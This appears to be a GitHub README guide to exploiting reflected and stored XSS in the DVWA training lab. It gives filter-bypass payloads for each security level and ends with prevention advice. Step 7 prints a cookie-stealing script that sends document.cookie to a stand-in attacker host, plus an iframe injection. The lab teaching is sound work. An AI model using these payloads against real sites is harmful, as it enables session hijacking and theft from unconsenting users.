# Mastering Cross-Site Scripting (XSS) with DVWA: A Penetration Testing Guide

![XSS Logo](https://img.icons8.com/color/96/code.png)

## Introduction to XSS

Cross-Site Scripting (XSS) is a prevalent web application vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts can execute in the victim's browser, potentially stealing sensitive data (e.g., cookies, session tokens), defacing websites, or redirecting users to malicious sites. XSS vulnerabilities arise when user input is improperly sanitized or displayed without encoding, enabling attackers to embed executable scripts.

### Types of XSS
- **Reflected XSS**: The malicious script is embedded in a URL or input field and executed immediately when the user visits the page or submits the input.
- **Stored XSS**: The script is stored on the server (e.g., in a database) and executed whenever a user loads the affected page.
- **DOM-based XSS**: The attack manipulates the Document Object Model (DOM) in the browser without server interaction.

This guide demonstrates how to identify and exploit XSS vulnerabilities in Damn Vulnerable Web Application (DVWA) using a Kali Linux virtual machine, focusing on ethical hacking practices. We’ll explore Reflected and Stored XSS attacks across different security levels (Low, Medium, High) and provide prevention strategies.

**Note**: This guide uses DVWA, a deliberately vulnerable web application for educational purposes. Unauthorized testing on live systems is illegal. Always obtain explicit permission before performing security testing.

## Prerequisites
- **Kali Linux**: A virtual machine with Kali Linux installed (download from [kali.org](https://www.kali.org/)).
- **DVWA**: Damn Vulnerable Web Application installed and configured (see [DVWA GitHub](https://github.com/digininja/DVWA)).
- **Web Browser**: Firefox or Chrome for testing.
- **Basic Knowledge**: Familiarity with web applications, HTML, JavaScript, and penetration testing concepts.

## Setting Up the Environment
1. **Install DVWA**:
   - Clone the DVWA repository:
     ```bash
     git clone https://github.com/digininja/DVWA.git
     ```
   - Follow the setup instructions in the DVWA documentation to configure it on a local web server (e.g., Apache with PHP and MySQL).
2. **Start Kali Linux**:
   - Launch your Kali Linux VM and ensure DVWA is accessible via the browser (e.g., `http://localhost/DVWA`).
3. **Log In to DVWA**:
   - Use the default credentials: `admin` / `password`.
   - Navigate to the DVWA security settings and adjust the security level as needed (Low, Medium, High).

## Step-by-Step Guide to XSS Exploitation

This guide follows the structure of a 10-minute demonstration video, covering Reflected and Stored XSS attacks at different security levels.

### Step 1: Introduction to DVWA and XSS
DVWA is a purpose-built vulnerable web application for learning web security. It provides a controlled environment to practice ethical hacking techniques. We’ll focus on the XSS (Reflected) and XSS (Stored) modules, testing vulnerabilities at Low, Medium, and High security levels.

- **Access DVWA**:
  - Open `http://localhost/DVWA` in your browser.
  - Log in with `admin` / `password`.
  - Navigate to the **DVWA Security** menu and set the security level to **Low**.

### Step 2: Reflected XSS at Low Security
Reflected XSS involves injecting a script into a URL or form input that is immediately reflected back to the user.

1. **Navigate to XSS (Reflected)**:
   - Go to the **XSS (Reflected)** page in DVWA.
2. **Test Basic Input**:
   - Enter `Reflected_Test` in the "What's your name?" field and submit.
   - Observe the output: `Hello Reflected_Test`.
3. **Inspect Source Code**:
   - Right-click the page and select **View Page Source** (or press `Ctrl+U`).
   - Notice the input is directly reflected in the HTML without sanitization.
4. **Inject a Simple XSS Payload**:
   - Enter the following in the input field:
     ```html
     <script>alert("You are hacked!")</script>
     ```
   - Submit and observe a popup displaying "You are hacked!".
   - This confirms the vulnerability, as the script executes in the browser.
5. **Attack Scenario**:
   - An attacker could craft a malicious URL (e.g., `http://localhost/DVWA/vulnerabilities/xss_r/?name=<script>alert("You are hacked!")</script>`) and trick a user into clicking it.

### Step 3: Reflected XSS at Medium Security
Medium security introduces basic input filtering, making exploitation slightly harder.

1. **Set Security Level to Medium**:
   - Update the security level in DVWA’s settings.
2. **Test the Same Payload**:
   - Submit `<script>alert("You are hacked!")</script>` again.
   - Observe that no popup appears; the script is displayed as plain text.
3. **Analyze Filtering**:
   - View the PHP source code (available in DVWA’s source view).
   - Note the use of `str_replace()` to remove `<script>` tags:
     ```php
     str_replace('<script>', '', $name)
     ```
4. **Bypass the Filter**:
   - Use a case variation to bypass the filter:
     ```html
     <ScRipt>alert("You are hacked!")</ScRipt>
     ```
   - Submit and observe the popup, confirming the bypass.

### Step 4: Reflected XSS at High Security
High security uses stricter filtering, requiring creative payloads.

1. **Set Security Level to High**:
   - Update the security level in DVWA.
2. **Test Previous Payloads**:
   - Try `<script>alert("You are hacked!")</script>` and `<ScRipt>alert("You are hacked!")</ScRipt>`.
   - Both fail due to a regular expression filter:
     ```php
     preg_replace('/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/i', '', $name)
     ```
3. **Use an Alternative Payload**:
   - Submit:
     ```html
     <img src=x onerror=alert("You_are_hacked!")>
     ```
   - The `img` tag’s `onerror` event triggers the alert, bypassing the script tag filter.

### Step 5: Stored XSS at Low Security
Stored XSS involves injecting a script that is saved on the server and executed for all users viewing the affected page.

1. **Navigate to XSS (Stored)**:
   - Go to the **XSS (Stored)** page in DVWA (Low security).
2. **Inject a Payload**:
   - In the guestbook message field, enter:
     ```html
     <script>alert("You are hacked!")</script>
     ```
   - Submit and refresh the page to see the alert execute.
3. **Impact**:
   - The script is stored in the database and executes for every user who views the guestbook, making it more dangerous than Reflected XSS.

### Step 6: Stored XSS at Medium and High Security
Medium and High security levels introduce stricter sanitization.

1. **Medium Security**:
   - Set the security level to Medium.
   - Try the same payload: `<script>alert("You are hacked!")</script>`.
   - If it fails, use a case variation:
     ```html
     <ScRipt>alert("You are hacked!")</ScRipt>
     ```
   - Submit and verify if the payload executes.
2. **High Security**:
   - Set the security level to High.
   - Try an alternative HTML element:
     ```html
     <svg onload=alert("You_are_hacked!")>
     ```
   - The `svg` tag’s `onload` event triggers the alert, bypassing stricter filters.

### Step 7: Advanced XSS Exploitation (Optional)
For advanced learners, explore additional XSS techniques:
- **Cookie Stealing**:
  ```html
  <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
  ```
- **Iframe Injection**:
  ```html
  <iframe src="http://malicious-site.com"></iframe>
  ```
- These payloads can steal session cookies or embed malicious content, highlighting the severity of XSS.

## Preventing XSS
Preventing XSS requires robust input validation and output encoding. Key strategies include:

- **Input Validation**: Allow only expected characters (e.g., alphanumeric) and reject malicious patterns.
- **Output Encoding**: Use functions like `htmlspecialchars()` in PHP to encode special characters before displaying user input.
- **Content Security Policy (CSP)**: Restrict script sources with a CSP header (e.g., `Content-Security-Policy: script-src 'self'`).
- **Sanitization Libraries**: Use libraries like DOMPurify to sanitize HTML inputs.
- **Escape JavaScript Contexts**: Ensure user input is properly escaped in JavaScript, HTML, and attribute contexts.
- **Secure Development Practices**: Follow OWASP guidelines and conduct regular security audits.

For detailed prevention techniques, refer to the [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).

## Conclusion
This guide demonstrated how to identify and exploit Reflected and Stored XSS vulnerabilities in DVWA across different security levels. By understanding these attacks, security professionals can better protect web applications. Always practice ethical hacking in controlled environments and obtain permission before testing.

Check out the full video tutorial and resources in this repository. Star and contribute to support the community!

**Resources**:
- [DVWA GitHub](https://github.com/digininja/DVWA)
- [Kali Linux](https://www.kali.org/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

**Disclaimer**: This guide is for educational purposes only. Unauthorized testing is illegal and unethical. Always obtain explicit permission before performing security testing.
